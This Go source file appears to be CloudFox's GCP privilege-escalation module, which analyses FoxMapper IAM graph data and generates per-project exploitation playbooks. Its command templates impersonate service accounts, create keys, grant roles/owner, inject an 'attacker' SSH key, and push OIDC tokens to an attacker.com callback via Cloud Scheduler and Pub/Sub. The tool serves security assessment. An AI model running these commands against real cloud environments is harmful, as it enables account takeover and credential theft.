package commands

import (
	"context"
	"fmt"
	"strings"
	"sync"

	foxmapperservice "github.com/BishopFox/cloudfox/gcp/services/foxmapperService"
	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	gcpinternal "github.com/BishopFox/cloudfox/internal/gcp"
	"github.com/spf13/cobra"
)

var GCPPrivescCommand = &cobra.Command{
	Use:     globals.GCP_PRIVESC_MODULE_NAME,
	Aliases: []string{"pe", "escalate", "priv"},
	Short:   "Identify privilege escalation paths in GCP organizations, folders, and projects",
	Long: `Analyze FoxMapper graph data to identify privilege escalation opportunities.

This module uses FoxMapper's graph-based analysis to find principals with paths
to admin-level access within the GCP environment.

Prerequisites:
- Run 'foxmapper gcp graph create' first to generate the graph data

Features:
- Identifies principals with privilege escalation paths to admin
- Shows shortest paths to organization, folder, and project admins
- Detects scope-limited paths (OAuth scope restrictions)
- Generates exploitation playbooks

Detected privilege escalation vectors include:
- Service Account Token Creation (getAccessToken, getOpenIdToken)
- Service Account Key Creation (serviceAccountKeys.create)
- IAM Policy Modification (setIamPolicy)
- Compute Instance Creation with privileged SA
- Cloud Functions/Run deployment with SA
- And 60+ more techniques

Run 'foxmapper gcp graph create' to generate the graph, then use this module.`,
	Run: runGCPPrivescCommand,
}

type PrivescModule struct {
	gcpinternal.BaseGCPModule

	// FoxMapper data
	FoxMapperCache *gcpinternal.FoxMapperCache
	Findings       []foxmapperservice.PrivescFinding
	OrgCache       *gcpinternal.OrgCache

	// Loot
	LootMap map[string]*internal.LootFile
	mu      sync.Mutex
}

type PrivescOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (o PrivescOutput) TableFiles() []internal.TableFile { return o.Table }
func (o PrivescOutput) LootFiles() []internal.LootFile   { return o.Loot }

func runGCPPrivescCommand(cmd *cobra.Command, args []string) {
	cmdCtx, err := gcpinternal.InitializeCommandContext(cmd, globals.GCP_PRIVESC_MODULE_NAME)
	if err != nil {
		return
	}

	module := &PrivescModule{
		BaseGCPModule: gcpinternal.NewBaseGCPModule(cmdCtx),
		Findings:      []foxmapperservice.PrivescFinding{},
		LootMap:       make(map[string]*internal.LootFile),
	}
	module.Execute(cmdCtx.Ctx, cmdCtx.Logger)
}

func (m *PrivescModule) Execute(ctx context.Context, logger internal.Logger) {
	logger.InfoM("Analyzing privilege escalation paths using FoxMapper...", globals.GCP_PRIVESC_MODULE_NAME)

	// Get OrgCache for project number resolution
	m.OrgCache = gcpinternal.GetOrgCacheFromContext(ctx)

	// Get FoxMapper cache from context or try to load it
	m.FoxMapperCache = gcpinternal.GetFoxMapperCacheFromContext(ctx)
	if m.FoxMapperCache == nil || !m.FoxMapperCache.IsPopulated() {
		// Try to load FoxMapper data (org from hierarchy if available)
		orgID := ""
		if m.Hierarchy != nil && len(m.Hierarchy.Organizations) > 0 {
			orgID = m.Hierarchy.Organizations[0].ID
		}
		m.FoxMapperCache = gcpinternal.TryLoadFoxMapper(orgID, m.ProjectIDs)
	}

	if m.FoxMapperCache == nil || !m.FoxMapperCache.IsPopulated() {
		logger.ErrorM("No FoxMapper data found. Run 'foxmapper gcp graph create' first.", globals.GCP_PRIVESC_MODULE_NAME)
		logger.InfoM("FoxMapper creates a graph of IAM relationships for accurate privesc analysis.", globals.GCP_PRIVESC_MODULE_NAME)
		return
	}

	// Get the FoxMapper service and analyze privesc
	svc := m.FoxMapperCache.GetService()
	m.Findings = svc.AnalyzePrivesc()

	// Generate loot
	m.generateLoot()

	if len(m.Findings) == 0 {
		logger.InfoM("No privilege escalation paths found", globals.GCP_PRIVESC_MODULE_NAME)
		return
	}

	// Count statistics
	adminCount := 0
	privescCount := 0
	orgReachable := 0
	folderReachable := 0
	projectReachable := 0

	for _, f := range m.Findings {
		if f.IsAdmin {
			adminCount++
		} else if f.CanEscalate {
			privescCount++
			if f.PathsToOrgAdmin > 0 {
				orgReachable++
			}
			if f.PathsToFolderAdmin > 0 {
				folderReachable++
			}
			if f.PathsToProjectAdmin > 0 {
				projectReachable++
			}
		}
	}

	logger.SuccessM(fmt.Sprintf("Found %d admin(s) and %d principal(s) with privilege escalation paths",
		adminCount, privescCount), globals.GCP_PRIVESC_MODULE_NAME)

	if privescCount > 0 {
		logger.InfoM(fmt.Sprintf("  → %d can reach org admin, %d folder admin, %d project admin",
			orgReachable, folderReachable, projectReachable), globals.GCP_PRIVESC_MODULE_NAME)
	}

	m.writeOutput(ctx, logger)
}

func (m *PrivescModule) generateLoot() {
	// Loot is now generated per-project in writeHierarchicalOutput/writeFlatOutput
}

// getPrivescExploitCommand returns specific exploitation commands for a privesc technique
// technique is the short reason, fullReason contains more details
func getPrivescExploitCommand(technique, fullReason, sourcePrincipal, targetPrincipal, project string) string {
	// Clean target principal for use in commands
	targetSA := targetPrincipal
	if strings.HasPrefix(targetSA, "serviceAccount:") {
		targetSA = strings.TrimPrefix(targetSA, "serviceAccount:")
	}
	if strings.HasPrefix(targetSA, "user:") {
		targetSA = strings.TrimPrefix(targetSA, "user:")
	}

	// Clean source principal
	sourceSA := sourcePrincipal
	if strings.HasPrefix(sourceSA, "serviceAccount:") {
		sourceSA = strings.TrimPrefix(sourceSA, "serviceAccount:")
	}

	// Combine technique and fullReason for matching
	combinedLower := strings.ToLower(technique + " " + fullReason)

	switch {
	// Service Account Token/Key Creation - most common privesc
	case strings.Contains(combinedLower, "getaccesstoken") || strings.Contains(combinedLower, "generateaccesstoken") ||
		strings.Contains(combinedLower, "iam.serviceaccounts.getaccesstoken"):
		return fmt.Sprintf("gcloud auth print-access-token --impersonate-service-account=%s", targetSA)

	case strings.Contains(combinedLower, "signblob") || strings.Contains(combinedLower, "iam.serviceaccounts.signblob"):
		return fmt.Sprintf("gcloud iam service-accounts sign-blob --iam-account=%s input.txt output.sig", targetSA)

	case strings.Contains(combinedLower, "signjwt") || strings.Contains(combinedLower, "iam.serviceaccounts.signjwt"):
		return fmt.Sprintf("gcloud iam service-accounts sign-jwt --iam-account=%s input.json output.jwt", targetSA)

	case strings.Contains(combinedLower, "serviceaccountkeys.create") || strings.Contains(combinedLower, "keys.create") ||
		strings.Contains(combinedLower, "iam.serviceaccountkeys.create"):
		return fmt.Sprintf("gcloud iam service-accounts keys create key.json --iam-account=%s", targetSA)

	case strings.Contains(combinedLower, "generateidtoken") || strings.Contains(combinedLower, "openidtoken") ||
		strings.Contains(combinedLower, "iam.serviceaccounts.generateidtoken"):
		return fmt.Sprintf("gcloud auth print-identity-token --impersonate-service-account=%s --audiences=https://example.com", targetSA)

	// Token Creator role - can impersonate
	case strings.Contains(combinedLower, "tokencreator") || strings.Contains(combinedLower, "serviceaccounttokencreator"):
		return fmt.Sprintf("# Has Token Creator role on target\ngcloud auth print-access-token --impersonate-service-account=%s", targetSA)

	// Service Account User role - can attach SA to resources
	case strings.Contains(combinedLower, "serviceaccountuser") || strings.Contains(combinedLower, "actas") ||
		strings.Contains(combinedLower, "iam.serviceaccounts.actas"):
		return fmt.Sprintf("# Has actAs permission - can attach this SA to compute resources\n# Option 1: Create VM with target SA\ngcloud compute instances create privesc-vm --service-account=%s --scopes=cloud-platform --zone=us-central1-a --project=%s\n\n# Option 2: Deploy Cloud Function with target SA\ngcloud functions deploy privesc-func --runtime=python39 --trigger-http --service-account=%s --source=. --entry-point=main --project=%s", targetSA, project, targetSA, project)

	// Workload Identity - GKE pod can impersonate SA
	case strings.Contains(combinedLower, "workload identity") || strings.Contains(combinedLower, "workloadidentity") ||
		strings.Contains(combinedLower, "gke") || strings.Contains(combinedLower, "kubernetes"):
		return fmt.Sprintf("# Workload Identity binding - GKE pod can impersonate SA\n# From within the GKE pod:\ncurl -H \"Metadata-Flavor: Google\" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/%s/token", targetSA)

	// IAM Policy Modification
	case strings.Contains(combinedLower, "setiampolicy") || strings.Contains(combinedLower, "resourcemanager") ||
		strings.Contains(combinedLower, "iam.setiampolicy"):
		if strings.Contains(combinedLower, "organization") || strings.Contains(combinedLower, "org") {
			return fmt.Sprintf("# Can modify org IAM policy\ngcloud organizations add-iam-policy-binding ORG_ID --member=serviceAccount:%s --role=roles/owner", sourceSA)
		} else if strings.Contains(combinedLower, "folder") {
			return fmt.Sprintf("# Can modify folder IAM policy\ngcloud resource-manager folders add-iam-policy-binding FOLDER_ID --member=serviceAccount:%s --role=roles/owner", sourceSA)
		}
		return fmt.Sprintf("# Can modify project IAM policy\ngcloud projects add-iam-policy-binding %s --member=serviceAccount:%s --role=roles/owner", project, sourceSA)

	// Compute Instance Creation
	case strings.Contains(combinedLower, "compute.instances.create") || strings.Contains(combinedLower, "create instance"):
		return fmt.Sprintf("gcloud compute instances create privesc-vm --service-account=%s --scopes=cloud-platform --zone=us-central1-a --project=%s", targetSA, project)

	case strings.Contains(combinedLower, "compute.instances.setserviceaccount"):
		return fmt.Sprintf("gcloud compute instances set-service-account INSTANCE_NAME --service-account=%s --scopes=cloud-platform --zone=ZONE --project=%s", targetSA, project)

	case strings.Contains(combinedLower, "compute.instances.setmetadata") || strings.Contains(combinedLower, "ssh"):
		return fmt.Sprintf("gcloud compute instances add-metadata INSTANCE_NAME --metadata=ssh-keys=\"attacker:$(cat ~/.ssh/id_rsa.pub)\" --zone=ZONE --project=%s", project)

	// Cloud Functions
	case strings.Contains(combinedLower, "cloudfunctions.functions.create") || strings.Contains(combinedLower, "functions.create"):
		return fmt.Sprintf("gcloud functions deploy privesc-func --runtime=python39 --trigger-http --service-account=%s --source=. --entry-point=main --project=%s", targetSA, project)

	case strings.Contains(combinedLower, "cloudfunctions.functions.update") || strings.Contains(combinedLower, "functions.update"):
		return fmt.Sprintf("gcloud functions deploy FUNCTION_NAME --service-account=%s --project=%s", targetSA, project)

	// Cloud Run
	case strings.Contains(combinedLower, "run.services.create") || strings.Contains(combinedLower, "cloudrun"):
		return fmt.Sprintf("gcloud run deploy privesc-svc --image=gcr.io/%s/privesc-img --service-account=%s --region=us-central1 --project=%s", project, targetSA, project)

	case strings.Contains(combinedLower, "run.services.update"):
		return fmt.Sprintf("gcloud run services update SERVICE_NAME --service-account=%s --region=REGION --project=%s", targetSA, project)

	// Cloud Scheduler
	case strings.Contains(combinedLower, "cloudscheduler") || strings.Contains(combinedLower, "scheduler.jobs"):
		return fmt.Sprintf("gcloud scheduler jobs create http privesc-job --schedule=\"* * * * *\" --uri=https://attacker.com/callback --oidc-service-account-email=%s --project=%s", targetSA, project)

	// Dataproc
	case strings.Contains(combinedLower, "dataproc"):
		return fmt.Sprintf("gcloud dataproc clusters create privesc-cluster --service-account=%s --region=us-central1 --project=%s", targetSA, project)

	// Composer
	case strings.Contains(combinedLower, "composer"):
		return fmt.Sprintf("gcloud composer environments create privesc-env --service-account=%s --location=us-central1 --project=%s", targetSA, project)

	// Workflows
	case strings.Contains(combinedLower, "workflows"):
		return fmt.Sprintf("gcloud workflows deploy privesc-workflow --source=workflow.yaml --service-account=%s --project=%s", targetSA, project)

	// Pub/Sub
	case strings.Contains(combinedLower, "pubsub"):
		return fmt.Sprintf("gcloud pubsub subscriptions create privesc-sub --topic=TOPIC --push-endpoint=https://attacker.com/endpoint --push-auth-service-account=%s --project=%s", targetSA, project)

	// Storage HMAC
	case strings.Contains(combinedLower, "storage.hmackeys"):
		return fmt.Sprintf("gsutil hmac create %s", targetSA)

	// Deployment Manager
	case strings.Contains(combinedLower, "deploymentmanager"):
		return fmt.Sprintf("gcloud deployment-manager deployments create privesc-deploy --config=deployment.yaml --project=%s", project)

	// API Keys
	case strings.Contains(combinedLower, "apikeys"):
		return fmt.Sprintf("gcloud alpha services api-keys create --project=%s", project)

	// Org Policy
	case strings.Contains(combinedLower, "orgpolicy"):
		return fmt.Sprintf("gcloud org-policies set-policy policy.yaml --project=%s", project)

	// Generic IAM edge - likely token creator or actAs relationship
	case strings.ToLower(technique) == "iam" || strings.Contains(combinedLower, "iam binding"):
		// Check if target is a service account
		if strings.Contains(targetSA, ".iam.gserviceaccount.com") || strings.Contains(targetSA, "@") {
			return fmt.Sprintf("# IAM relationship allows impersonation of target SA\n# Try token generation:\ngcloud auth print-access-token --impersonate-service-account=%s\n\n# Or create SA key (if permitted):\ngcloud iam service-accounts keys create key.json --iam-account=%s", targetSA, targetSA)
		}
		return fmt.Sprintf("# IAM relationship to target principal\n# Check IAM bindings for specific permissions:\ngcloud iam service-accounts get-iam-policy %s", targetSA)

	default:
		// Provide a helpful default with the most common privesc commands
		if strings.Contains(targetSA, ".iam.gserviceaccount.com") {
			return fmt.Sprintf("# %s\n# Target: %s\n\n# Try impersonation:\ngcloud auth print-access-token --impersonate-service-account=%s\n\n# Or create key:\ngcloud iam service-accounts keys create key.json --iam-account=%s", fullReason, targetSA, targetSA, targetSA)
		}
		return fmt.Sprintf("# %s\n# Target: %s", fullReason, targetSA)
	}
}

// writePrivescFindingToPlaybook writes a detailed privesc finding to the playbook
func (m *PrivescModule) writePrivescFindingToPlaybook(sb *strings.Builder, f foxmapperservice.PrivescFinding) {
	// Get source principal's project
	sourceProject := extractProjectFromPrincipal(f.Principal, m.OrgCache)
	if sourceProject == "" {
		sourceProject = "PROJECT"
	}

	sb.WriteString(fmt.Sprintf("# %s (%s)\n", f.Principal, f.MemberType))
	confidenceNote := ""
	if f.BestPathConfidence != "" && f.BestPathConfidence != "high" {
		confidenceNote = fmt.Sprintf(" | Confidence: %s", f.BestPathConfidence)
	}
	sb.WriteString(fmt.Sprintf("# Shortest path: %d hops | Viable paths: %d%s\n", f.ShortestPathHops, f.ViablePathCount, confidenceNote))
	if f.ScopeBlockedCount > 0 {
		sb.WriteString(fmt.Sprintf("# WARNING: %d paths blocked by OAuth scopes\n", f.ScopeBlockedCount))
	}
	sb.WriteString("\n")

	// Show the best path with actual commands
	if len(f.Paths) > 0 {
		// Only show the best (first) path with commands
		path := f.Paths[0]

		if path.ScopeBlocked {
			sb.WriteString("# NOTE: This path may be blocked by OAuth scope restrictions\n\n")
		}

		// If source is a service account, add impersonation
		if strings.Contains(f.MemberType, "serviceAccount") || strings.Contains(f.Principal, ".iam.gserviceaccount.com") {
			sb.WriteString(fmt.Sprintf("# Step 0: Impersonate the source service account\ngcloud config set auth/impersonate_service_account %s\n\n", f.Principal))
		}

		// Generate commands for each edge in the path
		currentPrincipal := f.Principal
		for i, edge := range path.Edges {
			annotations := ""
			if edge.ScopeBlocksEscalation {
				annotations = " [BLOCKED BY SCOPE]"
			} else if edge.ScopeLimited {
				annotations = " [scope-limited]"
			}
			edgeConf := edge.EffectiveConfidence()
			if edgeConf != "high" {
				annotations += fmt.Sprintf(" [%s confidence]", edgeConf)
			}

			// Use full reason if available, otherwise short reason
			displayReason := edge.Reason
			if displayReason == "" {
				displayReason = edge.ShortReason
			}

			sb.WriteString(fmt.Sprintf("# Step %d: %s%s\n", i+1, displayReason, annotations))

			// Get the exploit command for this technique (pass both short and full reason)
			cmd := getPrivescExploitCommand(edge.ShortReason, edge.Reason, currentPrincipal, edge.Destination, sourceProject)
			sb.WriteString(cmd)
			sb.WriteString("\n\n")

			currentPrincipal = edge.Destination
		}

		// Final note about admin access
		targetAdmin := path.Destination
		if strings.HasPrefix(targetAdmin, "serviceAccount:") {
			targetAdmin = strings.TrimPrefix(targetAdmin, "serviceAccount:")
		}
		sb.WriteString(fmt.Sprintf("# Result: Now have %s admin access via %s\n", path.AdminLevel, targetAdmin))
	}

	sb.WriteString("\n# -----------------------------------------------------------------------------\n\n")
}

func (m *PrivescModule) writeOutput(ctx context.Context, logger internal.Logger) {
	if m.Hierarchy != nil && !m.FlatOutput {
		m.writeHierarchicalOutput(ctx, logger)
	} else {
		m.writeFlatOutput(ctx, logger)
	}
}

func (m *PrivescModule) getHeader() []string {
	return []string{
		"Project",
		"Principal Type",
		"Principal",
		"Is Admin",
		"Admin Level",
		"Privesc To",
		"Privesc Admin Level",
		"Hops",
		"Confidence",
		"Permission",
	}
}

func (m *PrivescModule) findingsToTableBody() [][]string {
	var body [][]string
	for _, f := range m.Findings {
		// Extract project from principal
		project := extractProjectFromPrincipal(f.Principal, m.OrgCache)
		if project == "" {
			project = "-"
		}

		isAdmin := "No"
		if f.IsAdmin {
			isAdmin = "Yes"
		}

		adminLevel := f.HighestAdminLevel
		if adminLevel == "" {
			adminLevel = "-"
		}

		// Privesc target
		privescTo := "-"
		privescAdminLevel := "-"
		hops := "-"
		confidence := "-"
		permission := "-"

		if f.CanEscalate && len(f.Paths) > 0 {
			// Get the best path info
			bestPath := f.Paths[0]
			privescTo = bestPath.Destination
			// Clean up display
			if strings.HasPrefix(privescTo, "serviceAccount:") {
				privescTo = strings.TrimPrefix(privescTo, "serviceAccount:")
			} else if strings.HasPrefix(privescTo, "user:") {
				privescTo = strings.TrimPrefix(privescTo, "user:")
			}
			hops = fmt.Sprintf("%d", bestPath.HopCount)

			// Confidence from the best path
			confidence = bestPath.Confidence
			if confidence == "" {
				confidence = "high"
			}

			// Get the permission from the first edge - prefer Reason over ShortReason
			if len(bestPath.Edges) > 0 {
				permission = extractPermissionFromEdge(bestPath.Edges[0])
			}

			// Format privesc admin level
			// Try to get more info from the FoxMapper cache if available
			var destNode *foxmapperservice.Node
			if m.FoxMapperCache != nil && m.FoxMapperCache.IsPopulated() {
				destNode = m.FoxMapperCache.GetService().GetNode(bestPath.Destination)
			}

			switch bestPath.AdminLevel {
			case "org":
				privescAdminLevel = "Org"
			case "folder":
				// Try to extract folder from the destination node's IAM bindings
				if destNode != nil && len(destNode.IAMBindings) > 0 {
					for _, binding := range destNode.IAMBindings {
						if resource, ok := binding["resource"].(string); ok {
							if strings.HasPrefix(resource, "folders/") {
								folderID := strings.TrimPrefix(resource, "folders/")
								privescAdminLevel = fmt.Sprintf("Folder: %s", folderID)
								break
							}
						}
					}
				}
				if privescAdminLevel == "-" {
					privescAdminLevel = "Folder"
				}
			case "project":
				// Try to get the project ID from the destination node or principal
				if destNode != nil && destNode.ProjectID != "" {
					privescAdminLevel = fmt.Sprintf("Project: %s", destNode.ProjectID)
				} else {
					destProject := extractProjectFromPrincipal(bestPath.Destination, m.OrgCache)
					if destProject != "" {
						privescAdminLevel = fmt.Sprintf("Project: %s", destProject)
					} else {
						privescAdminLevel = "Project"
					}
				}
			default:
				privescAdminLevel = bestPath.AdminLevel
			}
		}

		body = append(body, []string{
			project,
			f.MemberType,
			f.Principal,
			isAdmin,
			adminLevel,
			privescTo,
			privescAdminLevel,
			hops,
			confidence,
			permission,
		})
	}
	return body
}

// extractPermissionFromEdge extracts a clean permission string from an edge
func extractPermissionFromEdge(edge foxmapperservice.Edge) string {
	reason := edge.Reason
	if reason == "" {
		reason = edge.ShortReason
	}

	// Try to extract actual IAM permission patterns
	reasonLower := strings.ToLower(reason)

	// Common permission patterns
	switch {
	case strings.Contains(reasonLower, "serviceaccounts.getaccesstoken") || strings.Contains(reasonLower, "getaccesstoken"):
		return "iam.serviceAccounts.getAccessToken"
	case strings.Contains(reasonLower, "serviceaccountkeys.create") || strings.Contains(reasonLower, "keys.create"):
		return "iam.serviceAccountKeys.create"
	case strings.Contains(reasonLower, "serviceaccounts.actas") || strings.Contains(reasonLower, "actas"):
		return "iam.serviceAccounts.actAs"
	case strings.Contains(reasonLower, "serviceaccounts.signblob") || strings.Contains(reasonLower, "signblob"):
		return "iam.serviceAccounts.signBlob"
	case strings.Contains(reasonLower, "serviceaccounts.signjwt") || strings.Contains(reasonLower, "signjwt"):
		return "iam.serviceAccounts.signJwt"
	case strings.Contains(reasonLower, "serviceaccounts.generateidtoken") || strings.Contains(reasonLower, "generateidtoken"):
		return "iam.serviceAccounts.generateIdToken"
	case strings.Contains(reasonLower, "getopenidtoken") || strings.Contains(reasonLower, "openidtoken") ||
		strings.Contains(reasonLower, "oidc token"):
		return "iam.serviceAccounts.getOpenIdToken"
	case strings.Contains(reasonLower, "tokencreator"):
		return "roles/iam.serviceAccountTokenCreator"
	case strings.Contains(reasonLower, "serviceaccountuser"):
		return "roles/iam.serviceAccountUser"
	case strings.Contains(reasonLower, "workload identity") || strings.Contains(reasonLower, "workloadidentity"):
		return "Workload Identity binding"
	case strings.Contains(reasonLower, "setiampolicy"):
		return "*.setIamPolicy"
	case strings.Contains(reasonLower, "compute.instances.create"):
		return "compute.instances.create"
	case strings.Contains(reasonLower, "cloudfunctions.functions.create"):
		return "cloudfunctions.functions.create"
	case strings.Contains(reasonLower, "run.services.create"):
		return "run.services.create"
	case strings.Contains(reasonLower, "owner"):
		return "roles/owner"
	case strings.Contains(reasonLower, "editor"):
		return "roles/editor"
	}

	// If we have a short reason that looks like a permission, use it
	if edge.ShortReason != "" && edge.ShortReason != "IAM" {
		return edge.ShortReason
	}

	// Default to the reason if nothing else matches
	return reason
}

// extractProjectFromPrincipal extracts project ID from a service account email.
// If orgCache is provided, it resolves project numbers to IDs.
// e.g., "sa@my-project.iam.gserviceaccount.com" -> "my-project"
func extractProjectFromPrincipal(principal string, orgCache ...*gcpinternal.OrgCache) string {
	var cache *gcpinternal.OrgCache
	if len(orgCache) > 0 {
		cache = orgCache[0]
	}

	// Helper to resolve a project number to ID via OrgCache
	resolveNumber := func(number string) string {
		if cache != nil && cache.IsPopulated() {
			if resolved := cache.GetProjectIDByNumber(number); resolved != "" {
				return resolved
			}
		}
		return ""
	}

	parts := strings.Split(principal, "@")
	if len(parts) != 2 {
		return ""
	}
	prefix := parts[0]
	domain := parts[1]

	// Pattern: name@project-id.iam.gserviceaccount.com (regular SAs)
	// But NOT gcp-sa-* domains (those are Google service agents with project numbers)
	if strings.HasSuffix(domain, ".iam.gserviceaccount.com") && !strings.HasPrefix(domain, "gcp-sa-") {
		projectPart := strings.TrimSuffix(domain, ".iam.gserviceaccount.com")
		return projectPart
	}

	// Pattern: service-PROJECT_NUMBER@gcp-sa-*.iam.gserviceaccount.com
	if strings.HasPrefix(domain, "gcp-sa-") && strings.HasSuffix(domain, ".iam.gserviceaccount.com") {
		number := prefix
		if strings.HasPrefix(prefix, "service-") {
			number = strings.TrimPrefix(prefix, "service-")
		}
		if resolved := resolveNumber(number); resolved != "" {
			return resolved
		}
		return ""
	}

	// Pattern: PROJECT_ID@appspot.gserviceaccount.com
	if domain == "appspot.gserviceaccount.com" {
		return prefix
	}

	// Pattern: PROJECT_NUMBER-compute@developer.gserviceaccount.com
	if strings.HasSuffix(domain, "developer.gserviceaccount.com") {
		if idx := strings.Index(prefix, "-compute"); idx > 0 {
			number := prefix[:idx]
			if resolved := resolveNumber(number); resolved != "" {
				return resolved
			}
		}
		return ""
	}

	// Pattern: PROJECT_NUMBER@cloudservices.gserviceaccount.com
	if domain == "cloudservices.gserviceaccount.com" {
		if resolved := resolveNumber(prefix); resolved != "" {
			return resolved
		}
		return ""
	}

	// Pattern: PROJECT_NUMBER@cloudbuild.gserviceaccount.com
	if domain == "cloudbuild.gserviceaccount.com" {
		if resolved := resolveNumber(prefix); resolved != "" {
			return resolved
		}
		return ""
	}

	return ""
}

// findingsForProject returns findings filtered for a specific project
// Includes: SAs from that project + users/groups (which apply to all projects)
func (m *PrivescModule) findingsForProject(projectID string) []foxmapperservice.PrivescFinding {
	var filtered []foxmapperservice.PrivescFinding
	for _, f := range m.Findings {
		principalProject := extractProjectFromPrincipal(f.Principal, m.OrgCache)
		// Include if: SA from this project OR user/group (no project - applies to all)
		if principalProject == projectID || principalProject == "" {
			filtered = append(filtered, f)
		}
	}
	return filtered
}

// findingsToTableBodyForProject returns table body for a specific project's findings
func (m *PrivescModule) findingsToTableBodyForProject(projectID string) [][]string {
	var body [][]string
	for _, f := range m.Findings {
		principalProject := extractProjectFromPrincipal(f.Principal, m.OrgCache)

		// Include if: SA from this project OR user/group (no project - applies to all)
		if principalProject != projectID && principalProject != "" {
			continue
		}

		// For display, show the principal's project or "-" for users/groups
		displayProject := principalProject
		if displayProject == "" {
			displayProject = "-"
		}

		isAdmin := "No"
		if f.IsAdmin {
			isAdmin = "Yes"
		}

		adminLevel := f.HighestAdminLevel
		if adminLevel == "" {
			adminLevel = "-"
		}

		// Privesc target
		privescTo := "-"
		privescAdminLevel := "-"
		hops := "-"
		confidence := "-"
		permission := "-"

		if f.CanEscalate && len(f.Paths) > 0 {
			bestPath := f.Paths[0]
			privescTo = bestPath.Destination
			if strings.HasPrefix(privescTo, "serviceAccount:") {
				privescTo = strings.TrimPrefix(privescTo, "serviceAccount:")
			} else if strings.HasPrefix(privescTo, "user:") {
				privescTo = strings.TrimPrefix(privescTo, "user:")
			}
			hops = fmt.Sprintf("%d", bestPath.HopCount)

			// Confidence from the best path
			confidence = bestPath.Confidence
			if confidence == "" {
				confidence = "high"
			}

			// Get the permission from the first edge
			if len(bestPath.Edges) > 0 {
				permission = extractPermissionFromEdge(bestPath.Edges[0])
			}

			// Format privesc admin level
			var destNode *foxmapperservice.Node
			if m.FoxMapperCache != nil && m.FoxMapperCache.IsPopulated() {
				destNode = m.FoxMapperCache.GetService().GetNode(bestPath.Destination)
			}

			switch bestPath.AdminLevel {
			case "org":
				privescAdminLevel = "Org"
			case "folder":
				if destNode != nil && len(destNode.IAMBindings) > 0 {
					for _, binding := range destNode.IAMBindings {
						if resource, ok := binding["resource"].(string); ok {
							if strings.HasPrefix(resource, "folders/") {
								folderID := strings.TrimPrefix(resource, "folders/")
								privescAdminLevel = fmt.Sprintf("Folder: %s", folderID)
								break
							}
						}
					}
				}
				if privescAdminLevel == "-" {
					privescAdminLevel = "Folder"
				}
			case "project":
				if destNode != nil && destNode.ProjectID != "" {
					privescAdminLevel = fmt.Sprintf("Project: %s", destNode.ProjectID)
				} else {
					destProject := extractProjectFromPrincipal(bestPath.Destination, m.OrgCache)
					if destProject != "" {
						privescAdminLevel = fmt.Sprintf("Project: %s", destProject)
					} else {
						privescAdminLevel = "Project"
					}
				}
			default:
				privescAdminLevel = bestPath.AdminLevel
			}
		}

		body = append(body, []string{
			displayProject,
			f.MemberType,
			f.Principal,
			isAdmin,
			adminLevel,
			privescTo,
			privescAdminLevel,
			hops,
			confidence,
			permission,
		})
	}
	return body
}

// generatePlaybookForProject generates a loot file specific to a project
func (m *PrivescModule) generatePlaybookForProject(projectID string) *internal.LootFile {
	findings := m.findingsForProject(projectID)
	if len(findings) == 0 {
		return nil
	}

	var sb strings.Builder
	sb.WriteString("# GCP Privilege Escalation Commands\n")
	sb.WriteString(fmt.Sprintf("# Project: %s\n", projectID))
	sb.WriteString("# Generated by CloudFox using FoxMapper graph data\n\n")

	// Group findings by admin level reachable
	var orgPaths, folderPaths, projectPaths []foxmapperservice.PrivescFinding

	for _, f := range findings {
		if f.IsAdmin || !f.CanEscalate {
			continue
		}
		switch f.HighestAdminLevel {
		case "org":
			orgPaths = append(orgPaths, f)
		case "folder":
			folderPaths = append(folderPaths, f)
		case "project":
			projectPaths = append(projectPaths, f)
		}
	}

	if len(orgPaths) > 0 {
		sb.WriteString("# =============================================================================\n")
		sb.WriteString("# CRITICAL: Organization Admin Reachable\n")
		sb.WriteString("# =============================================================================\n\n")
		for _, f := range orgPaths {
			m.writePrivescFindingToPlaybook(&sb, f)
		}
	}

	if len(folderPaths) > 0 {
		sb.WriteString("# =============================================================================\n")
		sb.WriteString("# HIGH: Folder Admin Reachable\n")
		sb.WriteString("# =============================================================================\n\n")
		for _, f := range folderPaths {
			m.writePrivescFindingToPlaybook(&sb, f)
		}
	}

	if len(projectPaths) > 0 {
		sb.WriteString("# =============================================================================\n")
		sb.WriteString("# MEDIUM: Project Admin Reachable\n")
		sb.WriteString("# =============================================================================\n\n")
		for _, f := range projectPaths {
			m.writePrivescFindingToPlaybook(&sb, f)
		}
	}

	contents := sb.String()
	// Check if empty (just header)
	headerOnly := fmt.Sprintf("# GCP Privilege Escalation Commands\n# Project: %s\n# Generated by CloudFox using FoxMapper graph data\n\n", projectID)
	if contents == headerOnly {
		return nil
	}

	return &internal.LootFile{
		Name:     "privesc-commands",
		Contents: contents,
	}
}

func (m *PrivescModule) writeHierarchicalOutput(ctx context.Context, logger internal.Logger) {
	outputData := internal.HierarchicalOutputData{
		OrgLevelData:     make(map[string]internal.CloudfoxOutput),
		FolderLevelData:  make(map[string]internal.CloudfoxOutput),
		ProjectLevelData: make(map[string]internal.CloudfoxOutput),
	}

	// Process each specified project
	for _, projectID := range m.ProjectIDs {
		var tableFiles []internal.TableFile

		// Build table for this project
		body := m.findingsToTableBodyForProject(projectID)
		if len(body) > 0 {
			tableFiles = append(tableFiles, internal.TableFile{
				Name:   "privesc-permissions",
				Header: m.getHeader(),
				Body:   body,
			})
		}

		// Generate loot file for this project
		var lootFiles []internal.LootFile
		playbook := m.generatePlaybookForProject(projectID)
		if playbook != nil {
			lootFiles = append(lootFiles, *playbook)
		}

		// Always add project to output (even if empty)
		outputData.ProjectLevelData[projectID] = PrivescOutput{Table: tableFiles, Loot: lootFiles}
	}

	pathBuilder := m.BuildPathBuilder()

	err := internal.HandleHierarchicalOutputSmart("gcp", m.Format, m.Verbosity, m.WrapTable, pathBuilder, outputData)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing hierarchical output: %v", err), globals.GCP_PRIVESC_MODULE_NAME)
	}
}

func (m *PrivescModule) writeFlatOutput(ctx context.Context, logger internal.Logger) {
	var tables []internal.TableFile

	// Build table with all findings
	if len(m.Findings) > 0 {
		tables = append(tables, internal.TableFile{
			Name:   "privesc-permissions",
			Header: m.getHeader(),
			Body:   m.findingsToTableBody(),
		})
	}

	// Generate per-project playbooks
	var lootFiles []internal.LootFile
	for _, projectID := range m.ProjectIDs {
		playbook := m.generatePlaybookForProject(projectID)
		if playbook != nil {
			// Rename to include project for flat output
			playbook.Name = fmt.Sprintf("privesc-commands-%s", projectID)
			lootFiles = append(lootFiles, *playbook)
		}
	}

